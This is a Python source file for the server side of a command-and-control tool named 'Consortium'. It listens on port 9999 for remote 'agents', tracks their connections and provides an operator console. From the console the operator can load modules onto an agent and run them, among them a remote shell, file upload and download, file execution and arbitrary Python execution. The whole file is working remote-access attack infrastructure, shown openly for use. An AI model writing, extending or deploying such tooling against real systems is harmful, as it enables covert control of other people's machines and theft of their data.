import importlib
import json
import re
import socket
import sys
import threading

from _custom_exceptions._internal_peer_error_error import InternalPeerErrorError
from _custom_exceptions._invalid_peer_response_error import InvalidPeerResponseError
from _custom_exceptions._peer_connection_errored_out_error import (
    PeerConnectionErroredOutError,
)
from _custom_exceptions._peer_timed_out_error import PeerTimedOutError


class ModuleLoader:
    def __init__(self):
        self._available_modules = {
            "ping": {
                "source": "modules//ping//source.py",
                "handler": "modules.ping.handler",
            },
            "shell": {
                "source": "modules//shell//source.py",
                "handler": "modules.shell.handler",
            },
            "download_http": {
                "source": "modules//download_http//source.py",
                "handler": "modules.download_http.handler",
            },
            "download": {
                "source": "modules//download//source.py",
                "handler": "modules.download.handler",
            },
            "upload": {
                "source": "modules//upload//source.py",
                "handler": "modules.upload.handler",
            },
            "exec_file": {
                "source": "modules//exec_file//source.py",
                "handler": "modules.exec_file.handler",
            },
            "python": {
                "source": "modules//python//source.py",
                "handler": "modules.python.handler",
            },
        }
        self._loaded_modules = {}

    def load_module(self, args, connection):
        try:
            module_name = args[0]
        except IndexError:
            print("[-] No module name provided")
            return

        if module_name not in self._available_modules:
            print(
                f'[-] Invalid module name, use command "available" to get all available modules to load',
            )
            return
        elif module_name in self._loaded_modules:
            print(f"[-] Module is already loaded")
            return

        with open(self._available_modules[module_name]["source"], "r") as f:
            source_code = f.read()
        connection.send_json(
            {
                "command": "load",
                "args": {"name": module_name, "source_code": source_code},
            },
        )
        _, response = connection.recv()
        print(response["message"])

        if response["success"]:
            module_obj = importlib.import_module(
                self._available_modules[module_name]["handler"],
            )
            self._loaded_modules[module_name] = module_obj.ModuleHandler()

    def unload_module(self, args, connection):
        try:
            module_name = args[0]
        except IndexError:
            print("[-] No module name provided")
            return

        if module_name not in self._loaded_modules:
            print(f"[-] Module does not appear to be loaded")
            return

        connection.send_json({"command": "unload", "args": {"name": module_name}})
        _, response = connection.recv()
        print(response["message"])

        if response["success"]:
            del self._loaded_modules[module_name]

    def reload_module(self, args, connection):
        try:
            module_name = args[0]
        except IndexError:
            print("[-] No module name provided")
            return

        if module_name not in self._available_modules:
            print(
                f'[-] Invalid module name, use command "available" to get all available modules to load',
            )
            return
        if module_name not in self._loaded_modules:
            print("[-] Module does not appear to be loaded")
            return

        with open(self._available_modules[module_name]["source"], "r") as f:
            source_code = f.read()
        connection.send_json(
            {
                "command": "reload",
                "args": {"name": module_name, "source_code": source_code},
            },
        )
        _, response = connection.recv()
        print(response["message"])

        if response["success"]:
            module_obj = importlib.import_module(
                self._available_modules[module_name]["handler"],
            )
            importlib.reload(module_obj)
            self._loaded_modules[module_name] = module_obj.ModuleHandler()

    def get_available_module_names(self):
        return list(self._available_modules.keys())

    def get_loaded_module_names(self):
        return list(self._loaded_modules.keys())

    def run_module(self, command, args, connection):
        self._loaded_modules[command].run_module(command, args, connection)


class Encoder:
    def __init__(self):
        pass

    def encode_data(self, data):
        """
        For standardization, encode_data always outputs bytes, any errors raised during encoding
        should raise InvalidPeerResponseError since the client doesnt speak the protocol. Encoder
        needs to distinguish between bytes and non bytes input for its encoding
        """
        try:
            if not isinstance(data, bytes):
                return data.encode()
            return data
        except Exception:
            raise InvalidPeerResponseError

    def decode_data(self, data):
        """
        For standardization, decode_data always outputs bytes, any errors raised during decoding
        should raise InvalidPeerResponseError since the client doesnt speak the protocol
        """
        try:
            return data
        except Exception:
            raise InvalidPeerResponseError


class Connection:
    def __init__(self, connection):
        self._connection = connection

        self._encoder = Encoder()

    def close_connection(self):
        try:
            self._connection.close()
            return True
        except Exception:
            return False

    def send_string(self, data):
        try:
            encoded_data = self._encoder.encode_data(data)
            self._connection.sendall(
                b"s:" + str(len(encoded_data)).encode() + b":" + encoded_data,
            )
        except ConnectionError:
            raise PeerConnectionErroredOutError

    def send_bytes(self, data):
        try:
            encoded_data = self._encoder.encode_data(data)
            self._connection.sendall(
                b"b:" + str(len(encoded_data)).encode() + b":" + encoded_data,
            )
        except ConnectionError:
            raise PeerConnectionErroredOutError

    def send_json(self, data):
        try:
            encoded_data = self._encoder.encode_data(json.dumps(data))
            self._connection.sendall(
                b"j:" + str(len(encoded_data)).encode() + b":" + encoded_data,
            )
        except ConnectionError:
            raise PeerConnectionErroredOutError

    def send_exception(self, data):
        try:
            encoded_data = self._encoder.encode_data(json.dumps(data))
            self._connection.sendall(
                b"e:" + str(len(encoded_data)).encode() + b":" + encoded_data,
            )
        except ConnectionError:
            raise PeerConnectionErroredOutError

    def recv(self):
        initial_timeout = None
        chunk_timeout = None
        chunk = 4096

        self._connection.settimeout(initial_timeout)

        try:
            received_header = False
            initial_bytes = []
            for _ in range(1024):
                single_byte = self._connection.recv(1)
                initial_bytes.append(single_byte)
                if initial_bytes.count(b":") == 2:
                    received_header = True
                    break
            if not received_header:
                raise InvalidPeerResponseError(b"".join(initial_bytes))
        except TimeoutError:
            if initial_bytes:
                raise InvalidPeerResponseError(b"".join(initial_bytes))
            else:
                raise PeerTimedOutError
        except ConnectionError:
            raise PeerConnectionErroredOutError(b"".join(initial_bytes))

        try:
            header = b"".join(initial_bytes)
            msg_type = header.split(b":")[0].decode()
            msg_len = int(header.split(b":")[1])
        except ValueError:
            raise InvalidPeerResponseError(b"".join(initial_bytes))

        received_data = []
        received_data_len = 0
        self._connection.settimeout(chunk_timeout)
        while True:
            try:
                if msg_len - received_data_len > 1024:
                    chunk = self._connection.recv(1024)
                    received_data.append(chunk)
                    received_data_len += len(chunk)
                else:
                    chunk = self._connection.recv(msg_len - received_data_len)
                    received_data.append(chunk)
                    received_data_len += len(chunk)
            except TimeoutError:
                if received_data:
                    raise InvalidPeerResponseError(header + b"".join(received_data))
                else:
                    raise PeerTimedOutError(header + b"".join(received_data))
            except ConnectionError:
                raise PeerConnectionErroredOutError(header + b"".join(received_data))

            if received_data_len == msg_len:
                break
        self._connection.settimeout(None)

        if msg_type == "s":
            output_data = self._encoder.decode_data(b"".join(received_data)).decode()
        elif msg_type == "j":
            output_data = json.loads(
                self._encoder.decode_data(b"".join(received_data)).decode(),
            )
        elif msg_type == "b":
            output_data = self._encoder.decode_data(b"".join(received_data))
        elif msg_type == "e":
            output_data = self._encoder.decode_data(b"".join(received_data)).decode()
            raise InternalPeerErrorError(output_data)
        else:
            raise InvalidPeerResponseError(b"".join(received_data))
        return msg_type, output_data


class Listener:
    def __init__(self, local_host, local_port):
        self._local_host = local_host
        self._local_port = local_port
        self._agent_connections = {}
        self._is_running = False

    def _listener_startup(self) -> bool:
        """
        Listener startup logic (independent of agent), runs before all other code, check for permissions, craete tmp files/dirs, etc.
        If returns false, listener will not start
        """
        return True

    def _listener_loop(self) -> bool:
        """
        Listener main loop, create connection, send commands and receive results from agent
        """
        agent_id = 0
        while self._is_running:
            try:
                s = socket.socket()
                s.settimeout(5)
                s.bind((self._local_host, self._local_port))
                s.listen(5)
                c, a = s.accept()
                connection = Connection(c)
                self._agent_connections[str(agent_id)] = [connection, ModuleLoader()]
                agent_id += 1
                print("[+] Agent connected!")
            except Exception:
                pass

    def _listener_cleanup(self):
        """
        Listener cleanup logic (independent of agent), runs at the very end, remove temporary files, etc
        """
        return True

    def start_listener(self):
        """
        Start listener in a thread, all agents that connect are put into the agent_connection dict
        """
        if self._is_running:
            return False

        if self._listener_startup():
            self._is_running = True
            print("[*] Starting listener...")
            self._thread = threading.Thread(target=self._listener_loop)
            self._thread.start()
            return True
        return False

    def stop_listener(self):
        """
        Stop listener thread if it is running, disconnect all connected agents in the agent_connection dict
        """
        if not self._is_running:
            return False

        print("[*] Stopping listener...")
        self._is_running = False
        self._thread.join()
        for _, v in self._agent_connections.items():
            v[0].close_connection()


class Interface:
    def __init__(self):
        self._listener = Listener("0.0.0.0", 9999)
        self._listener.start_listener()

    def _shlex_text(self, s, platform="this"):
        if platform == "this":
            platform = sys.platform != "win32"
        if platform == 1:
            RE_CMD_LEX = r""""((?:\\["\\]|[^"])*)"|'([^']*)'|(\\.)|(&&?|\|\|?|\d?\>|[<])|([^\s'"\\&|<>]+)|(\s+)|(.)"""
        elif platform == 0:
            RE_CMD_LEX = r""""((?:""|\\["\\]|[^"])*)"?()|(\\\\(?=\\*")|\\")|(&&?|\|\|?|\d?>|[<])|([^\s"&|<>]+)|(\s+)|(.)"""
        else:
            raise AssertionError("unkown platform %r" % platform)

        args = []
        accu = None  # collects pieces of one arg
        for qs, qss, esc, pipe, word, white, fail in re.findall(RE_CMD_LEX, s):
            if word:
                pass  # most frequent
            elif esc:
                word = esc[1]
            elif white or pipe:
                if accu is not None:
                    args.append(accu)
                if pipe:
                    args.append(pipe)
                accu = None
                continue
            elif fail:
                raise ValueError("invalid or incomplete shell string")
            elif qs:
                word = qs.replace('\\"', '"').replace("\\\\", "\\")
                if platform == 0:
                    word = word.replace('""', '"')
            else:
                word = qss  # may be even empty; must be last

            accu = (accu or "") + word

        if accu is not None:
            args.append(accu)

        if not args:
            return "", []
        else:
            return args[0], args[1:]

    def _interact_interface(self, agent_id):
        connection = self._listener._agent_connections[agent_id][0]
        module_loader = self._listener._agent_connections[agent_id][1]
        while True:
            try:
                while True:
                    input_text = input(f"Consortium (Agent - {agent_id}) > ")
                    command, args = self._shlex_text(input_text)

                    if not command:
                        continue
                    elif command == "load":
                        module_loader.load_module(args, connection)
                    elif command == "reload":
                        module_loader.reload_module(args, connection)
                    elif command == "unload":
                        module_loader.unload_module(args, connection)
                    elif command == "available":
                        print("[*] Available module names : ")
                        for module_name in module_loader.get_available_module_names():
                            print(f" | [*] {module_name}")
                    elif command == "loaded":
                        print("[*] Loaded modules names : ")
                        for module_name in module_loader.get_loaded_module_names():
                            print(f" | [*] {module_name}")
                    elif command in module_loader.get_loaded_module_names():
                        module_loader.run_module(command, args, connection)
                    elif command in ("exit", "disconnect", "sleep"):
                        connection.send_json({"command": command, "args": None})
                        _, response = connection.recv()
                        print(response)
                        if command == "exit":
                            del self._listener._agent_connections[agent_id]
                            return True
                        else:
                            return False
                    elif command == "back":
                        print("[*] Returning to home...")
                        return True
                    else:
                        print("[-] Invalid command")
            except (
                InvalidPeerResponseError,
                PeerConnectionErroredOutError,
                PeerTimedOutError,
            ) as e:
                print(f"[-] Connection to agent died, reason : {e}")
                del self._listener._agent_connections[agent_id]
                return False
            except InternalPeerErrorError as e:
                print(f"[-] Agent experienced an unexpected error : {str(e)}")

    def _home_interface(self):
        while True:
            input_text = input("Consortium (Home) > ")
            command, args = input_text.split(" ")[0], input_text.split(" ")[1:]
            if not command:
                continue
            elif command == "list":
                print(f"[*] Available agents : ")
                for k, _ in self._listener._agent_connections.items():
                    print(f" | [*] Agent ID : {k}")
            elif command == "interact":
                if args[0] not in self._listener._agent_connections:
                    print('[-] Invalid agent ID, run "list" to see available agent IDs')
                    continue
                self._interact_interface(args[0])
            elif command == "exit":
                self._listener.stop_listener()
                break
            else:
                print("[-] Invalid command")

    def start_interface(self):
        self._home_interface()


if __name__ == "__main__":
    interface = Interface()
    interface.start_interface()
